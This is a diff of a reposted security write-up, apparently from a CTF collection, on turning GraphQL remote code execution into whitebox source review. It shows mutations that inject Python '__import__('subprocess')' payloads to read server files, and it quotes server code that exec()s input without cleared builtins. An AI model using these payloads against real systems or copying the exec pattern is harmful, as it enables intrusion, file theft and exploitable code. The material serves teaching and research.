@@ -1,30 +1,20 @@
 # :globe_with_meridians: The vulnerability in the server's own code:
 
-> **Original Source:** [The vulnerability in the server's own code:](https://infosecwriteups.com/graphql-rce-the-kill-chain-to-cloud-identity-324699602931)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 ## Phase 3: The Whitebox Pivot…!
 
-
 RCE is a spark, but source code is a floodlight…I used the `subprocess` module to read the server's own heart—its backend logic…!
-
 
 By executing `cat /workspace/main.py`, I realized the app was importing a module called `python_function.function`…I followed the trail and found the "Smoking Gun" in the sandbox logic:
 
-
 ## Get MPGODMATCH’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
 
-
 Reading main.py:
-
 
 ```
 mutation InjectReadFile {
@@ -46,7 +36,6 @@ pythonScript: "str(__import__('subprocess').check_output(['cat', '/workspace/mai
 }
 ```
 
-
 ```
 mutation TriggerRCE_V3 {
 evalFormula(input: {
@@ -60,9 +49,7 @@ displayValue
 }
 ```
 
-
 From the response of Main.py:
-
 
 ```
 
@@ -71,13 +58,8 @@ global_ns = { "xl": xl, "xl_*s": xl_*s }
 exec(compile(tree, filename="", mode="exec"), global_ns, global_ns)
 ```
 
-
 The Flaw: They passed `global_ns` but forgot to set `__builtins__: {}`. Because of that one missing line, my `__import__` payload worked perfectly…!
-
 
 I also read many other internal files, also did the SSRF, But I have more interesting impact showing POC…!
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/graphql-rce-the-kill-chain-to-cloud-identity-324699602931). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
